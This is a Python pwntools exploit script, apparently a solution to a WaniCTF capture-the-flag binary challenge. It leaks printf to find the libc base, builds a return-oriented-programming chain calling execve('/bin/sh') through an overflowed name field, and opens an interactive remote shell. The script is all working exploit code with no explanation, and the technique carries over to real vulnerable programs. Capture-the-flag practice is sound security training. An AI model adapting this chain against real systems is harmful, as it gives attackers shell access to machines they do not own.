from pwn import *
context(arch='amd64',terminal=['tmux','new-window'])
local = False
pop_rdi_ret_off = 0x000000000010f75b if not local else 0x000000000002daa2
pop_rsi_ret_off = 0x0000000000110a4d if not local else 0x0000000000037bca
pop_rdx_r12_off = 0x0000000000106731
bin_sh_offs = 0x1cb42f if not local else 0x1b46a5
fname = './chall'
host = 'chal-lz56g6.wanictf.org'
port = 9005
libc = ELF('./libc.so.6') if not local else ELF('/glibc/2.34/64/lib/libc.so.6')

r = remote(host,port) if not local else process(["/glibc/2.34/64/lib/ld-linux-x86-64.so.2",fname],env={"LD_PRELOAD":"/glibc/2.34/64/lib/libc.so.6"})

def leak_printf_flag():
    log.info('... get printf address')
    l = r.recvline().decode()
    return int(l.split('=')[1].strip(),16)

def send_user(name, cal, amount):
    r.recvuntil(b':')
    log.info(f'... sending name {name}')
    r.sendline(name)
    r.recvuntil(b':')
    log.info(f'... sending calories {cal}')
    r.sendline(cal)
    r.recvuntil(b':')
    log.info(f'... sending amount {amount}')
    r.sendline(amount)





if __name__ == '__main__':
    printf = leak_printf_flag()
    base = printf - libc.sym['printf']
    execve = base +libc.sym['execve']
    pop_rdi_ret = base + pop_rdi_ret_off
    pop_rsi_ret = base + pop_rsi_ret_off
    pop_rdx_r12 = base + pop_rdx_r12_off
    bin_sh = base + bin_sh_offs
    
    log.info(f"execve @ {hex(execve)}")
    log.info(f"pop_rdi_ret @ {hex(pop_rdi_ret)}")
    log.info(f"bin_sh @ {hex(bin_sh)}")

    for i in range(3):
        send_user(b'a',b'2',b'1')
    
    if local:
        gdb.attach(r,'''

        ''')
    pad = p64(pop_rdx_r12)+p64(0)+p64(0) if local else b''
    send_user(p64(pop_rdi_ret)+p64(bin_sh)+p64(pop_rsi_ret)+p64(0)+pad+p64(execve),b'$',b'$')
    r.interactive()
